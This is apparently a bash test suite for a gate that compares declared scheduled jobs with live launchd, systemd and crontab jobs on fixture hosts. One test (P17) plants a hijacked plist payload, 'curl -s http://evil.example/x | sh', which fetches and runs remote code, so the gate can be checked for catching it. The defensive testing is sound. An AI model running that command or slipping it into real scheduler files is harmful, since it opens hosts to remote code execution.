#!/usr/bin/env bash
# scripts/check-scheduled-parity.test.sh — the PARITY GATE's proof (agent-infra#2048).
#
# WHAT THIS SUITE IS FOR. The measured defect was 35 live launchd components against ONE known to the
# installer and ZERO systemd units. Nothing was broken; nothing was COMPARED. Every assertion below is
# one direction of that comparison, on a fixture host, so the gate's teeth can be demonstrated without
# touching the real scheduler:
#
#   P1  one declaration, BOTH platforms: a single record renders a systemd unit + timer on Linux and a
#       launchd plist on Darwin, with the SAME script, args, env and arming flag
#   P2  UNDECLARED  — the host runs a scheduled job the declaration lacks                    → FAIL
#   P3  MISSING     — the declaration names a job the host does not run                      → FAIL
#   P4  INERT       — declared + installed but NOT loaded: a schedule that never fires        → FAIL
#   P5  SCHEDULE-DRIFT — the installed interval is not the declared one                      → FAIL
#   P6  the 34-of-35 case, literally: 35 live jobs, 1 declared ⇒ exactly 34 UNDECLARED findings
#   P7  UNMANAGED   — registered WITH a reason is accepted, and counted                      → ok
#   P8  NO-REASON / STALE-REGISTER / CONFLICT                                                → FAIL
#   P9  out-of-namespace agents are EXCLUDED AND COUNTED (never silently invisible)
#   P10 an unreadable surface exits 3, NEVER 0 — "I looked at nothing" is not "clean"
#   P11 the static half (CI mode): declaration defects are named, both platforms must render
#   P12 the systemd side: MISSING / INERT / UNDECLARED behave identically
#   P13 crontab entries in the fleet namespace are in scope; a personal entry is counted, not a finding
#
# Hermetic: a throwaway HOME, agent dir, unit dir, shim `launchctl`/`systemctl`/`crontab` and
# declaration/register all live under $T. Nothing here can read or write the real scheduler.
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GATE="$HERE/check-scheduled-parity.sh"
PASS=0
FAIL=0
ok()  { PASS=$((PASS + 1)); echo "  ✅ $1"; }
bad() { FAIL=$((FAIL + 1)); echo "  ❌ $1"; }
assert_eq()       { if [ "$1" = "$2" ]; then ok "$3"; else bad "$3 (got: '$1', want: '$2')"; fi; }
assert_contains() { if grep -qF -- "$2" <<<"$1"; then ok "$3"; else bad "$3 (missing: $2)"; fi; }
assert_absent()   { if grep -qF -- "$2" <<<"$1"; then bad "$3 (unexpected: $2)"; else ok "$3"; fi; }
assert_count()    { # assert_count <haystack> <needle> <n> <label>
    local n; n=$(printf '%s\n' "$1" | grep -cF -- "$2")
    if [ "$n" = "$3" ]; then ok "$4"; else bad "$4 (found $n of '$2', want $3)"; fi
}

[ -f "$GATE" ] || { echo "FATAL: $GATE missing — this suite tests the gate, and there is none"; exit 1; }

T="$(mktemp -d "${TMPDIR:-/tmp}/sj-parity-test.XXXXXX")"
T="$(cd "$T" && pwd -P)"
trap 'rm -rf "$T"' EXIT
mkdir -p "$T/home" "$T/farm" "$T/bin"

# ── fixtures: a fake component, a fake scheduler pair, a fake declaration ──────────────────────
mk_script() { # mk_script <name>
    printf '#!/usr/bin/env bash\necho "fake %s $*"\n' "$1" >"$T/farm/$1"
    chmod +x "$T/farm/$1"
}
mk_script alpha.sh
mk_script beta.sh
mk_script gamma.sh

# launchctl shim: loaded-state is a FILE, so "installed vs loaded" is two independent facts — which is
# exactly the distinction INERT exists to catch.
cat >"$T/bin/launchctl" <<'LC'
#!/usr/bin/env bash
printf 'launchctl %s\n' "$*" >>"${LC_LOG:-/dev/null}"
state="${LC_STATE:-/nonexistent}"
case "${1:-}" in
  print)   lbl="${2##*/}"; grep -qxF "$lbl" "$state" 2>/dev/null && { printf '\tstate = running\n\tlast exit code = %s\n' "${LC_EXIT:-0}"; exit 0; }; exit 1 ;;
  list)    [ "${LC_LIST_RC:-0}" = 0 ] || exit "$LC_LIST_RC"
           printf 'PID\tStatus\tLabel\n'
           [ -f "$state" ] && while IFS= read -r l; do [ -n "$l" ] && printf -- '-\t0\t%s\n' "$l"; done <"$state"
           exit 0 ;;
  bootstrap|enable|kickstart) exit 0 ;;
  bootout)  exit 0 ;;
esac
exit 0
LC
chmod +x "$T/bin/launchctl"

cat >"$T/bin/systemctl" <<'SC'
#!/usr/bin/env bash
printf 'systemctl %s\n' "$*" >>"${SC_LOG:-/dev/null}"
state="${SC_STATE:-/nonexistent}"   # file: unit bases that are ACTIVE
case "${1:-}" in
  is-active)   base="${2:-}"; grep -qxF "$base" "$state" 2>/dev/null && { echo active; exit 0; }; echo inactive; exit 3 ;;
  is-enabled)  echo enabled; exit 0 ;;
  show)        echo "${SC_EXIT:-0}"; exit 0 ;;
  daemon-reload|enable|restart|start|stop|disable|--version) exit 0 ;;
esac
exit 0
SC
chmod +x "$T/bin/systemctl"

cat >"$T/bin/crontab" <<'CR'
#!/usr/bin/env bash
# rc 1 = "no crontab for this user" (an EMPTY surface, a real measurement); any other rc is the
# unreadable case the gate must refuse to read as clean.
[ "${CRON_RC:-0}" = 0 ] || exit "$CRON_RC"
cat "${CRON_FILE:-/dev/null}" 2>/dev/null || true
exit 0
CR
chmod +x "$T/bin/crontab"

# mkplist <dir> <label> <interval> — a plist with a REAL StartInterval, so drift is measurable.
mkplist() {
    cat >"$1/$2.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
    <key>Label</key><string>$2</string>
    <key>StartInterval</key><integer>$3</integer>
</dict></plist>
EOF
}

# mkrendered <dir> <id> [arming] — the REAL darwin artifact for a record, rendered by the same code
# the installer runs. A hand-written stub would let the payload/schedule checks pass vacuously.
mkrendered() {
    local dir="$1" id="$2" arm="${3:-}"
    HOME="$T/home" SJ_DECLARATION="${DCL:-$D}" SJ_FARM="$T/farm" SJ_LAUNCHER="$T/farm/launcher.py" \
    SJ_STATE_DIR="$T/home/.pi/agent/state" SJ_REPOS="$T/farm" \
        bash -c '. "$0/lib/scheduled-jobs.sh" && sj_render_launchd "$1" "$2" "$3"' \
        "$HERE" "$id" "$dir/$(HOME="$T/home" SJ_DECLARATION="${DCL:-$D}" bash -c '. "$0/lib/scheduled-jobs.sh" && sj_label "$1"' "$HERE" "$id").plist" "$arm"
}

# mkrendered_systemd <dir> <id> [arming] — the REAL linux artifacts (unit + timer).
mkrendered_systemd() {
    local dir="$1" id="$2" arm="${3:-}"
    HOME="$T/home" SJ_DECLARATION="${DCL:-$D}" SJ_FARM="$T/farm" \
    SJ_STATE_DIR="$T/home/.pi/agent/state" SJ_REPOS="$T/farm" \
        bash -c '. "$0/lib/scheduled-jobs.sh" && sj_render_systemd "$1" "$2" "system" "$3"' \
        "$HERE" "$id" "$dir" "$arm"
}

# decl <file> — a one-record declaration for alpha, on both platforms.
decl_alpha() {
    cat >"$1" <<'D'
job alpha
  description=fixture alpha
  platforms=linux,darwin
  schedule=900s
  script=alpha.sh
  runner=bash
  arming=report-only
  managed=yes
  owner=scheduled-jobs.sh
  label=com.eldato.alpha
  unit=eldato-alpha
  env FIXTURE_VAR=hello
D
}

gate_mac() { # gate_mac <decl> [args...]
    local d="$1"; shift
    HOME="$T/home" PATH="$T/bin:$PATH" PORTABLE_PLATFORM=darwin \
    SJ_DECLARATION="$d" SJ_UNMANAGED_REGISTER="${REG:-$T/none.register}" \
    SJ_FARM="$T/farm" SJ_LAUNCHD_DIR="${AGENTS:-$T/agents}" SJ_LAUNCHCTL="$T/bin/launchctl" \
    LC_STATE="$T/loaded" LC_LOG="$T/lc.log" LC_LIST_RC="${LC_LIST_RC:-0}" SJ_NAMESPACES="com.eldato.,com.tortoise." \
    bash "$GATE" "$@"
}
gate_lin() { # gate_lin <decl> [args...]
    local d="$1"; shift
    HOME="$T/home" PATH="$T/bin:$PATH" PORTABLE_PLATFORM=linux \
    SJ_DECLARATION="$d" SJ_UNMANAGED_REGISTER="${REG:-$T/none.register}" \
    SJ_FARM="$T/farm" SJ_SYSTEMD_UNIT_DIR="${UNITS:-$T/units}" SJ_SYSTEMCTL="$T/bin/systemctl" \
    SC_STATE="$T/active" SC_LOG="$T/sc.log" CRON_RC="${CRON_RC:-0}" SJ_NAMESPACES="com.eldato.,com.tortoise." \
    bash "$GATE" "$@"
}

fresh_mac() { # reset the darwin fixture surface
    rm -rf "$T/agents"; mkdir -p "$T/agents"; : >"$T/loaded"
}
fresh_lin() {
    rm -rf "$T/units"; mkdir -p "$T/units"; : >"$T/active"
}

# ── P1 one declaration, both platforms ────────────────────────────────────────────────────────
echo "── P1 ONE declaration rendered for BOTH platforms ──"
D="$T/decl-alpha"; decl_alpha "$D"
fresh_mac
mkplist "$T/agents" com.eldato.alpha 900
echo com.eldato.alpha >"$T/loaded"
OUT="$(gate_mac "$D" --static 2>&1)"; RC=$?
assert_eq "$RC" "0" "P1 the static half passes for a valid declaration"
assert_contains "$OUT" "verdict=OK" "P1 …and says so"
# The rendering itself: same record → two artifacts. Read them directly, not through the gate's prose.
D2="$(mktemp -d "$T/render.XXXXXX")"
HOME="$T/home" SJ_DECLARATION="$D" SJ_FARM="$T/farm" SJ_REPOS="$T/farm:/tmp" \
    bash -c '. "$0/lib/scheduled-jobs.sh" && sj_render_systemd alpha "$1" system && sj_render_launchd alpha "$1/com.eldato.alpha.plist"' \
    "$HERE" "$D2" >/dev/null 2>&1
assert_eq "$?" "0" "P1 both renderers succeed from the one record"
assert_file_ok() { [ -f "$1" ] && ok "$2" || bad "$2 (missing: $1)"; }
assert_file_ok "$D2/eldato-alpha.service" "P1 the Linux artifact is a systemd service"
assert_file_ok "$D2/eldato-alpha.timer"   "P1 …with a timer beside it"
assert_file_ok "$D2/com.eldato.alpha.plist" "P1 the Darwin artifact is a launchd plist"
SVC="$(cat "$D2/eldato-alpha.service")"; TIM="$(cat "$D2/eldato-alpha.timer")"; PL="$(cat "$D2/com.eldato.alpha.plist")"
assert_contains "$SVC" "$T/farm/alpha.sh" "P1 the unit runs the SAME script the plist does"
assert_contains "$PL"  "$T/farm/alpha.sh" "P1 …verified from the plist"
assert_contains "$SVC" 'FIXTURE_VAR=hello' "P1 the record's env reaches the unit"
assert_contains "$PL"  'FIXTURE_VAR'       "P1 …and the plist"
assert_contains "$SVC" '--dry-run' "P1 the shipped stance (report-only) is IN the unit, not a default"
assert_contains "$PL"  '--dry-run' "P1 …and IN the plist"
assert_contains "$TIM" 'OnUnitActiveSec=900s' "P1 a 900s schedule renders as a systemd interval timer"
assert_contains "$PL"  '<integer>900</integer>' "P1 …and as StartInterval 900 on Darwin"
assert_absent "$SVC" 'SuccessExitStatus' "P1 the unit does NOT declare a non-zero exit successful (a failed pass must not read as success)"

# ── P2/P3 the two directions ─────────────────────────────────────────────────────────────────
echo "── P2/P3 UNDECLARED and MISSING ──"
fresh_mac
mkplist "$T/agents" com.eldato.alpha 900
mkplist "$T/agents" com.eldato.rogue 3600
printf 'com.eldato.alpha\ncom.eldato.rogue\n' >"$T/loaded"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P2 a live job the declaration lacks FAILS the gate"
assert_contains "$OUT" "UNDECLARED com.eldato.rogue" "P2 …and names it as UNDECLARED"
assert_absent "$OUT" "UNDECLARED com.eldato.alpha" "P2 a declared+live job is not flagged"
fresh_mac
printf 'com.eldato.alpha\n' >"$T/loaded"
mkplist "$T/agents" com.eldato.beta 900   # beta is live-ish but NOT declared; alpha has no plist
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P3 a declared job the host does not run FAILS the gate"
assert_contains "$OUT" "MISSING alpha" "P3 …named as MISSING"
assert_contains "$OUT" "UNDECLARED com.eldato.beta" "P3 …and the reverse direction is reported in the same run"

# ── P4 INERT ─────────────────────────────────────────────────────────────────────────────────
echo "── P4 INERT — installed but never fires ──"
fresh_mac
mkplist "$T/agents" com.eldato.alpha 900
: >"$T/loaded"          # the plist is on disk; launchd does not have it
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P4 an installed job that is NOT loaded FAILS"
assert_contains "$OUT" "INERT alpha" "P4 …and is named INERT, not 'installed'"

# ── P5 schedule drift ───────────────────────────────────────────────────────────────────────
echo "── P5 SCHEDULE-DRIFT ──"
fresh_mac
mkplist "$T/agents" com.eldato.alpha 3600    # declared 900s
echo com.eldato.alpha >"$T/loaded"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P5 a live interval that is not the declared one FAILS"
assert_contains "$OUT" "SCHEDULE-DRIFT alpha" "P5 …naming declared vs installed"

# ── P6 the measured 34-of-35 case, literally ─────────────────────────────────────────────────
echo "── P6 THE 34-OF-35 CASE ──"
fresh_mac
mkplist "$T/agents" com.eldato.alpha 900
echo com.eldato.alpha >"$T/loaded"
i=1
while [ "$i" -le 34 ]; do
    mkplist "$T/agents" "com.eldato.agent-$i" 900
    printf 'com.eldato.agent-%s\n' "$i" >>"$T/loaded"
    i=$((i + 1))
done
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P6 35 live jobs against 1 declared record FAILS"
assert_count "$OUT" "UNDECLARED com.eldato.agent-" "34" "P6 …with EXACTLY 34 UNDECLARED findings — the measured defect, caught"
assert_contains "$OUT" "in_scope=35" "P6 the measurement reports the population it read (35)"

# ── P7 UNMANAGED with a reason ───────────────────────────────────────────────────────────────
echo "── P7 UNMANAGED (reasoned) is accepted ──"
fresh_mac
mkrendered "$T/agents" alpha
mkplist "$T/agents" com.eldato.rogue 3600
echo com.eldato.alpha >"$T/loaded"; echo com.eldato.rogue >>"$T/loaded"
REG="$T/reg-ok"
printf '%s\n' '# a register' 'com.eldato.rogue|owned by another deployer, tracked in the fleet board' >"$REG"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "0" "P7 a live job registered WITH a reason does not fail the gate"
assert_contains "$OUT" "unmanaged=1" "P7 …and is counted as unmanaged"

# ── P8 the register's own failure modes ─────────────────────────────────────────────────────
echo "── P8 NO-REASON / STALE-REGISTER / CONFLICT ──"
REG="$T/reg-noreason"; printf 'com.eldato.rogue|\n' >"$REG"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P8 an unmanaged entry with NO reason FAILS"
assert_contains "$OUT" "NO-REASON com.eldato.rogue" "P8 …and says why"
REG="$T/reg-stale"; printf 'com.eldato.gone|retired somewhere else\n' >"$REG"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P8 a register entry for a job that is no longer live FAILS"
assert_contains "$OUT" "STALE-REGISTER com.eldato.gone" "P8 …as STALE, so the register cannot accumulate"
REG="$T/reg-conflict"; printf 'com.eldato.alpha|also registered here\n' >"$REG"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P8 a job that is BOTH declared and registered FAILS"
assert_contains "$OUT" "CONFLICT alpha" "P8 …naming the conflict"
REG=""

# ── P9 out-of-namespace exclusion is visible ────────────────────────────────────────────────
echo "── P9 third-party agents are excluded AND COUNTED ──"
fresh_mac
mkrendered "$T/agents" alpha
mkplist "$T/agents" com.google.keystone.agent 3600
mkplist "$T/agents" com.premise.bar 600
echo com.eldato.alpha >"$T/loaded"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "0" "P9 a third-party agent is not an undeclared fleet job"
assert_contains "$OUT" "out_of_scope_excluded=2" "P9 …and the exclusion is COUNTED, not silent"
# A `.plist.disabled` / `.bak-*` file is not a job; it must not be counted as one either.
printf 'x\n' >"$T/agents/com.eldato.alpha.plist.disabled"
OUT="$(gate_mac "$D" 2>&1)"
assert_absent "$OUT" "UNDECLARED com.eldato.alpha.plist.disabled" "P9 a disabled/bak file is not a scheduled job"

# ── P10 an unreadable surface is exit 3, never 0 ────────────────────────────────────────────
echo "── P10 an unreadable surface NEVER reads as clean ──"
AGENTS="$T/does-not-exist"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "3" "P10 no agent directory ⇒ exit 3 (could not measure), NOT 0"
assert_contains "$OUT" "verdict=UNMEASURABLE" "P10 …with an explicit verdict"
AGENTS=""
fresh_mac
: >"$T/loaded"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P10 a readable but EMPTY surface is a FAILURE, not a pass"
assert_contains "$OUT" "NO-JOBS" "P10 …named NO-JOBS"

# ── P11 declaration defects are named ──────────────────────────────────────────────────────
echo "── P11 declaration defects (the static half) ──"
BAD="$T/decl-bad"
cat >"$BAD" <<'D'
job broken
  platforms=linuxx
  schedule=every-fortnight
  script=missing-script.sh
  runner=bash
  managed=yes
  arming=maybe
  platfroms=linux
D
OUT="$(gate_mac "$BAD" --static 2>&1)"; RC=$?
assert_eq "$RC" "1" "P11 a malformed declaration FAILS the static half"
assert_contains "$OUT" "unknown platform 'linuxx'" "P11 …naming the bad platform"
assert_contains "$OUT" "unparseable schedule" "P11 …the bad schedule"
assert_contains "$OUT" "unknown key 'platfroms'" "P11 …and a MISSPELLED key, which would otherwise silently drop a platform"
assert_contains "$OUT" "does not resolve" "P11 …and the missing script"
assert_contains "$OUT" "unknown arming 'maybe'" "P11 …and the bad arming stance"
EMPTY="$T/decl-empty"; printf '# nothing here\n' >"$EMPTY"
OUT="$(gate_mac "$EMPTY" --static 2>&1)"; RC=$?
assert_eq "$RC" "1" "P11 an EMPTY declaration is a failure (an empty schedule is not a schedule)"
# A Darwin record with no label would render an inert job; it must be refused.
NOLABEL="$T/decl-nolabel"; printf 'job x\n  platforms=darwin\n  schedule=hourly\n  script=alpha.sh\n  runner=bash\n  managed=no\n  owner=someone.sh\n' >"$NOLABEL"
OUT="$(gate_mac "$NOLABEL" --static 2>&1)"
assert_contains "$OUT" "declares no label" "P11 a darwin record with no label is refused"
# An unmanaged record with no owner is refused: an unowned schedule is how a job goes missing.
NOOWNER="$T/decl-noowner"; printf 'job y\n  platforms=darwin\n  schedule=hourly\n  runner=bash\n  managed=no\n  label=com.eldato.y\n' >"$NOOWNER"
OUT="$(gate_mac "$NOOWNER" --static 2>&1)"
assert_contains "$OUT" "names no owner" "P11 an unmanaged record with no owner is refused"

# ── P12 the systemd side behaves identically ───────────────────────────────────────────────
echo "── P12 the systemd (Linux) side ──"
fresh_lin
mkrendered_systemd "$T/units" alpha
: >"$T/active"     # installed, not active ⇒ INERT
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P12 a Linux timer present but inactive FAILS"
assert_contains "$OUT" "INERT alpha" "P12 …as INERT, same vocabulary as Darwin"
printf 'eldato-alpha.timer\n' >"$T/active"
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "0" "P12 an installed+active timer on the declared set passes"
assert_contains "$OUT" "verdict=OK" "P12 …and the verdict names the platform"
fresh_lin
printf '#!/usr/bin/env bash\n' >"$T/units/eldato-rogue.timer"
printf 'eldato-rogue.timer\n' >"$T/active"
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P12 an undeclared Linux timer FAILS"
assert_contains "$OUT" "UNDECLARED eldato-rogue" "P12 …named as UNDECLARED"
fresh_lin
printf '#!/usr/bin/env bash\n' >"$T/units/eldato-alpha.timer"
printf 'eldato-alpha.timer\n' >"$T/active"
UNITS="$T/nonexistent-units"
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "3" "P12 no unit directory ⇒ exit 3, never 0"

# ── P14-P20 the shapes an adversarial review reproduced, one assertion each ───────────────────
# Every one of these read GREEN before the fix. They are here because a gate is only as strong as the
# failure it can still see: each assertion below fails against the pre-fix implementation.
echo "── P14 the register cannot launder a job (separator, blank reason) ──"
fresh_mac
mkrendered "$T/agents" alpha
mkplist "$T/agents" com.eldato.rogue 3600
echo com.eldato.alpha >"$T/loaded"; echo com.eldato.rogue >>"$T/loaded"
REG="$T/reg-bare"; printf 'com.eldato.rogue\n' >"$REG"        # a bare label: no separator at all
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P14 a register line with NO '|' does not count as a reason"
assert_contains "$OUT" "NO-REASON com.eldato.rogue" "P14 …it is named NO-REASON instead"
REG="$T/reg-blankdecl"; printf 'com.eldato.alpha|\n' >"$REG"  # declared AND blank-reasoned
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P14 a DECLARED job registered with a BLANK reason FAILS"
assert_contains "$OUT" "NO-REASON alpha" "P14 …and the declaration/register disagreement is named"

echo "── P15 the schedule is read on BOTH platforms ──"
REG="$T/none.register"
UNITS="$T/units"
fresh_lin
mkrendered_systemd "$T/units" alpha
sed 's/^OnUnitActiveSec=900s/OnCalendar=daily/' "$T/units/eldato-alpha.timer" >"$T/t.timer"
mv "$T/t.timer" "$T/units/eldato-alpha.timer"
printf 'eldato-alpha.timer\n' >"$T/active"
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P15 a LINUX timer on a different cadence than declared FAILS (was: never checked)"
assert_contains "$OUT" "SCHEDULE-DRIFT alpha" "P15 …as SCHEDULE-DRIFT"
fresh_lin
mkrendered_systemd "$T/units" alpha
rm -f "$T/units/eldato-alpha.service"          # the timer is active; the JOB it triggers is gone
printf 'eldato-alpha.timer\n' >"$T/active"
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P15 a timer whose .service is ABSENT FAILS (installed, enabled, can never run)"
assert_contains "$OUT" "MISSING alpha" "P15 …as MISSING, not as a healthy install"

echo "── P16 the darwin artifact's own schedule is compared ──"
fresh_mac
mkrendered "$T/agents" alpha
set_sched() { # set_sched <python-ish sed-free rewrite: file, key-block replacement>
    :; }
# swap the interval for a CALENDAR the declaration does not state
awk '{ if ($0 ~ /<key>StartInterval<\/key>/) { print "    <key>StartCalendarInterval</key>"; print "    <dict><key>Hour</key><integer>23</integer></dict>"; skip=1; next } if (skip==1 && $0 ~ /<integer>/) { skip=0; next } print }' \
    "$T/agents/com.eldato.alpha.plist" >"$T/p1" && mv "$T/p1" "$T/agents/com.eldato.alpha.plist"
echo com.eldato.alpha >"$T/loaded"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P16 a calendar artifact against an interval declaration FAILS (was: silent)"
assert_contains "$OUT" "SCHEDULE-DRIFT alpha" "P16 …as SCHEDULE-DRIFT"
# a REAL-valued interval is a real interval, not "unverifiable"
mkrendered "$T/agents" alpha
sed 's|<integer>900</integer>|<real>7200</real>|' "$T/agents/com.eldato.alpha.plist" >"$T/p2"
mv "$T/p2" "$T/agents/com.eldato.alpha.plist"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P16 a <real> StartInterval is READ and compared (7200 != 900)"
# no schedule key at all
mkrendered "$T/agents" alpha
awk '! /<key>StartInterval<\/key>/ && ! /<integer>900<\/integer>/' \
    "$T/agents/com.eldato.alpha.plist" >"$T/p3" && mv "$T/p3" "$T/agents/com.eldato.alpha.plist"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P16 an artifact with NO schedule key FAILS (was: a 'note' that --quiet hid)"

echo "── P17 the payload: a hijacked artifact is not a scheduled job ──"
mkrendered "$T/agents" alpha
sed 's|<string>--dry-run</string>|<string>--apply</string>|' "$T/agents/com.eldato.alpha.plist" >"$T/p4"
mv "$T/p4" "$T/agents/com.eldato.alpha.plist"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "0" "P17 arming a job is NOT drift (the stance is read from the artifact, #1678)"
mkrendered "$T/agents" alpha
awk '{ if ($0 ~ /<key>ProgramArguments<\/key>/) { print; print "        <array>"; print "            <string>/bin/sh</string>"; print "            <string>-c</string>"; print "            <string>curl -s http://evil.example/x | sh</string>"; print "        </array>"; skip=1; next } if (skip==1) { if ($0 ~ /<\/array>/) skip=0; next } print }' \
    "$T/agents/com.eldato.alpha.plist" >"$T/p5" && mv "$T/p5" "$T/agents/com.eldato.alpha.plist"
OUT="$(gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P17 a REPLACED program FAILS the gate (label and cadence preserved)"
assert_contains "$OUT" "PAYLOAD-DRIFT alpha" "P17 …as PAYLOAD-DRIFT"

echo "── P18 an unreadable population is exit 3, never green ──"
mkrendered "$T/agents" alpha; echo com.eldato.alpha >"$T/loaded"
OUT="$(LC_LIST_RC=3 gate_mac "$D" 2>&1)"; RC=$?
assert_eq "$RC" "3" "P18 'launchctl list' failing exits 3 (the loaded population was NOT read)"
fresh_lin
mkrendered_systemd "$T/units" alpha; printf 'eldato-alpha.timer\n' >"$T/active"
OUT="$(CRON_RC=2 gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "3" "P18 'crontab -l' failing exits 3 (an unreadable crontab is not an empty one)"
OUT="$(CRON_RC=1 gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "0" "P18 …but rc 1 ('no crontab for this user') IS an empty, measured surface"

echo "── P19 the declaration's own malformed shapes ──"
BAD="$T/bad-orphan"
{ printf '  env ORPHANED=1\n'; cat "$D"; } >"$BAD"
OUT="$(gate_mac "$BAD" --static 2>&1)"; RC=$?
assert_eq "$RC" "1" "P19 a key ABOVE the first 'job' record FAILS (was: dropped silently)"
assert_contains "$OUT" "BEFORE the first 'job'" "P19 …and says where it belongs"
BAD="$T/bad-zero"; sed 's/^  schedule=.*/  schedule=0s/' "$D" >"$BAD"
OUT="$(gate_mac "$BAD" --static 2>&1)"; RC=$?
assert_eq "$RC" "1" "P19 schedule=0s FAILS (a job that never fires)"
assert_contains "$OUT" "0 seconds" "P19 …named as a schedule that cannot fire"
BAD="$T/bad-escape"; sed 's|^  unit=.*|  unit=../../ESCAPED-alpha|' "$D" >"$BAD"
OUT="$(gate_mac "$BAD" --static 2>&1)"; RC=$?
assert_eq "$RC" "1" "P19 a unit name with a path traversal FAILS"
assert_contains "$OUT" "path separator or traversal" "P19 …and names the reason"

echo "── P20 the register is platform-scoped ──"
fresh_lin
mkrendered_systemd "$T/units" alpha; printf 'eldato-alpha.timer\n' >"$T/active"
REG="$T/reg-maconly"; printf 'com.tortoise.some-mac-job|owned by the Mac deployer\n' >"$REG"
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "0" "P20 a launchd-label register entry does not redden a LINUX host"
assert_absent "$OUT" "STALE-REGISTER com.tortoise.some-mac-job" "P20 …it is not reported STALE there"
REG="$T/none.register"

# ── P13 crontab ─────────────────────────────────────────────────────────────────────────────
echo "── P13 crontab ──"
fresh_lin
UNITS="$T/units"
mkrendered_systemd "$T/units" alpha
printf 'eldato-alpha.timer\n' >"$T/active"
printf '%s\n' '0 3 * * * /Users/someone/backup.sh' >"$T/cron"
export CRON_FILE="$T/cron"
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "0" "P13 a personal crontab entry is not a fleet job"
printf '%s\n' '0 4 * * * /Users/someone/eldato-old-reaper.sh' >"$T/cron"
OUT="$(gate_lin "$D" 2>&1)"; RC=$?
assert_eq "$RC" "1" "P13 a crontab entry in the fleet's namespace IS in scope"
assert_contains "$OUT" "UNDECLARED" "P13 …and is reported as undeclared"
unset CRON_FILE

echo
echo "──────────────────────────────────────────────────────────────────────"
if [ "$FAIL" -eq 0 ]; then echo "ALL PASS ($PASS assertions)"; exit 0; fi
echo "FAILURES: $FAIL of $PASS assertions"
exit 1
